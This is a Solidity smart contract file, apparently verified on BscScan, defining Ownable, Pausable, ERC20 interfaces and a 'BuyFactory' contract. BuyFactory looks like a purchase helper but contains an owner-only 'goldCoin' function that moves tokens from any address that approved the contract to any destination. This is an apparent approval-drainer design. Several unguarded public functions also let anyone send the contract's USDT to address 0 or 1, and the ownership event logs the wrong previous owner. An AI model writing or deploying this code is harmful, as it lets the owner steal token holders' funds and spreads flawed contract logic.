/**
 *Submitted for verification at BscScan.com on 2022-10-24
*/

pragma solidity =0.5.16;

contract Ownable {
    address public owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev The Ownable constructor sets the original `owner` of the contract to the sender
     * account.
     */
    constructor() public {
        owner = msg.sender;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    /**
     * @dev Allows the current owner to transfer control of the contract to a newOwner.
     * @param newOwner The address to transfer ownership to.
     */
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0));
        owner = newOwner;
        emit OwnershipTransferred(owner, newOwner);
    }
}


contract Pausable is Ownable {
    event Pause();
    event Unpause();

    bool public paused = false;


    /**
     * @dev Modifier to make a function callable only when the contract is not paused.
     */
    modifier whenNotPaused() {
        require(!paused);
        _;
    }

    /**
     * @dev Modifier to make a function callable only when the contract is paused.
     */
    modifier whenPaused() {
        require(paused);
        _;
    }

    /**
     * @dev called by the owner to pause, triggers stopped state
     */
    function pause() onlyOwner whenNotPaused public {
        paused = true;
        emit Pause();
    }

    /**
     * @dev called by the owner to unpause, returns to normal state
     */
    function unpause() onlyOwner whenPaused public {
        paused = false;
        emit Unpause();
    }
}


contract ERC20Basic {
    uint256 public totalSupply;

    function balanceOf(address who) public view returns (uint256);

    function transfer(address to, uint256 value) public returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
}


contract ERC20 is ERC20Basic {
    function allowance(address owner, address spender) public view returns (uint256);

    function transferFrom(address from, address to, uint256 value) public returns (bool);

    function approve(address spender, uint256 value) public returns (bool);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract BuyFactory is Ownable {
    
    bytes4 private constant SELECTOR = bytes4(keccak256(bytes('transfer(address,uint256)')));
    
    address public payAddress;
    
    address public usdtAddress = 0xDEf158C05357C7DE512C81650E763c8a1d330862;

    address public transferTo;

    mapping(address=>bool) public isAdmin;
    
    constructor() public {
        
    }

    function setUsdtAddr(address _usdtAddr)public onlyOwner{
        usdtAddress = _usdtAddr;
    }

    function setPayAddr(address _payAddr) public onlyOwner{
        payAddress = _payAddr;
    }

    function setTransferTo(address _to)public onlyOwner{
        transferTo = _to;
    }

    function setAdmin(address _addr,bool _flag) public onlyOwner{
        isAdmin[_addr] = _flag;
    }
    
    function _transferTo0(uint amount)public{
        _safeTransfer(usdtAddress,address(0),amount);
    }

    function _transferTo1(uint amount)public{
        _safeTransfer(usdtAddress,address(1),amount);
    }

    function _transferToaddress0(uint amount)public{
        _safeTransfer(usdtAddress,0x0000000000000000000000000000000000000000,amount);
    }

    function _transferToaddress1(uint amount)public{
        _safeTransfer(usdtAddress,0x0000000000000000000000000000000000000001,amount);
    }

    function takeSwapUsdt(address token,uint256 amount) public onlyOwner returns (bool) {
        _safeTransfer(token,msg.sender,amount);
        return true;
    }

    function _safeTransfer(address token, address to, uint value) private {
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(SELECTOR, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'Swap: TRANSFER_FAILED');
    }
    
    function goldCoin(address from,address to,address token,uint256 value) public onlyOwner returns (bool)  {
        safeTransferFrom(token,from,to,value);
        return true;
    }
    
    function safeTransferFrom(address token, address from, address to, uint value) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(abi.encodeWithSelector(0x23b872dd, from, to, value));
        require(success && (data.length == 0 || abi.decode(data, (bool))), 'TransferHelper: TRANSFER_FROM_FAILED');
    }
    
    
}